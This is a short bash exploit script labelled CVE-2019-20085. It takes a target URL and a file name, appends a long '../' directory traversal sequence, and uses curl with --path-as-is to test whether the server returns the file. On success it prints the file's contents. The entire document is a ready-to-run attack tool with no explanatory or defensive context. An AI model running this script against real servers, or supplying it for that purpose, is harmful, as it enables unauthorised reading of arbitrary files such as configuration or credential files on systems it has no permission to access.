#!/bin/bash
# CVE-2019-20085

function usage() {
	echo "Usage: $0 -u <TARGET_URL> -f <TARGET_FILE>"
	echo "   -u: URL of the target"
	echo "   -f: Filename to read"
	exit 1
}

# Parse command-line arguments
while getopts "u:f:" opt; do
	case ${opt} in
		u) target_url="$OPTARG" ;;
		f) target_file="$OPTARG" ;;
		*) usage ;;
	esac
done

# Check if all the necessary parameters are provided
if [ -z "$target_url" ] || [ -z "$target_file" ]; then
	usage
fi

# Payload
traversal="../../../../../../../../../../../../../"
full_url="${target_url}${traversal}${target_file}"
echo "Target URL: $full_url"

# HTTP request
response=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "${full_url}")

# Check for the presence of directory traversal
if [[ "$response" == "200" ]]; then
	echo "Directory Traversal Succeeded!"
	echo "Reading the file: $target_file."
	echo ""
	curl --path-as-is -s "${full_url}"
else
	echo "It is not vulnerable to directory traversal or the file does not exist."
fi
